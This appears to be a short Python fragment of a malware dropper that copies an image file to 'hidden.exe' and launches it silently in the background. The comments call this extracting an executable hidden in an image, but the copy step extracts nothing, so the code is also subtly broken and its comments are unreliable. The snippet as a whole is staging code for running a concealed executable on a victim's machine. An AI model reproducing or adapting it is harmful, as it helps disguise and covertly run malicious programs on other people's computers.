import os
import shutil

image = "./images/snake_cover_"
# Extract the EXE from the image
shutil.copy("new_image.jpg", "hidden.exe")

# Run the hidden EXE in the background
os.system("start hidden.exe")
